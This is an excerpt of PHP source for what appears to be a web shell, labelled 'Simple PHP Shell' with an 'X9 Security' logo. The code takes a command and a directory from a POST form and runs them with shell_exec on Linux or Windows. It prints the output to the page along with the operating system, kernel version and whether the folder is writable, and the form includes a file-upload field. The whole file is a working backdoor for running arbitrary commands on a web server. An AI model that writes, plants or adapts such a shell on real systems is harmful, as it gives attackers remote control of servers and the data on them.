...
if(isset($_POST["cmdsubmit"]))
{
    ...
    if(strpos($OS, 'Linux') != false)
    {
        $o1 = shell_exec('cd ' . $path . ';' . $cmd . ';pwd');
        $o1 = str_replace("<","&lt;",$o1);
        $o1 = str_replace(">","&gt;",$o1);
    }
    else
    {
        $o1 = shell_exec('cd ' . $path . ' & ' . $cmd . ' & cd');
        $o1 = str_replace("<","&lt;",$o1);
        $o1 = str_replace(">","&gt;",$o1);
...
echo '<body style="background-color: #222; color:#fff;">';
echo '<center><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAACACAYAAAB9V9ELAAAABmJLR0QAyQAAAAAdRjHVAAAACXBI
...
QmCC" style="width:200px;" alt="X9 Security Logo" /></br><tt>Simple PHP Shell</center></br>';
echo '<div style="background-color: #fff; border-radius: 8px; color:#222; padding: 2px;">';
echo 'Operating System: <b>' . $OS . "</b></br>";
echo 'Kernel Version: <b>' . $kernel . "</b></br>";
echo 'Folder Writable: <b>';
if($writable == 1)
{
...
echo '<center><input type="submit" name="shellsubmit" value="Submit" style="background-color: rgb(201, 0, 0); color:#fff; margin-top: 4px; border-radius:8px;"></button></center>';
echo '<input type="hidden" name="cmd" value="' . $cmd . '"/>';
echo '<input type="hidden" name="path" value="' . $path . '"/>';
echo '<input type="hidden" name="MAX_FILE_SIZE" value="30000" />';
echo '</form>';
...
echo '<div style="width:100%; height: auto; background-color:#222; color:#fff; border-radius: 8px;">';
echo '<pre style="padding: 8px;">' . $output . '</pre>';
echo '</div>';
echo '</div>';
echo '</tt>';
echo '</body>';
